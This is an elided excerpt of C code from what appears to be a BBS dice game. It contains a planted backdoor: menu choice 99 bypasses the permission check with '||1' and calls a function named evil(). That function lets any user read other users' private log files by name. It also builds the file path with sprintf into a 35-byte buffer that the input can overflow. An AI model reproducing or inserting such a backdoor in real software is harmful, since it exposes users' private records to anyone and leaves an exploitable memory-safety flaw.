...
└──┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┘
  ...
  while (1)
  {
    ...
    choice = atoi(buf);
    if (choice == 99 && (HAS_PERM(PERM_ALLADMIN)||1))
    {
      evil();
      break;
    }
    ...
    out_song();
    vmsg(buf);
    move(14, 0);		/* xatier 100629 蓋掉已經印出的骰子 */
    outs("\n\n\n\n\n");		/* 下一局的時候才不會還在那裡 */
  }
...
void evil ()
{
  char pswd[10], buf[31], path[35];
  vget(b_lines - 1, 0, "Password: ", pswd, 9, NOECHO);
  ...
  for (;;)
  {
    vget(b_lines - 1, 0, "(NULL) ", buf, 30, DOECHO);
    sprintf(path, "usr/%c/%s/log", buf[0], buf);
    more(path, MFST_NULL);
    vget(b_lines - 1, 0, "continue? (y/[N])", buf, 2, DOECHO);
    if (!(buf[0] == 'Y' || buf[0] == 'y'))
      break;
  }
}
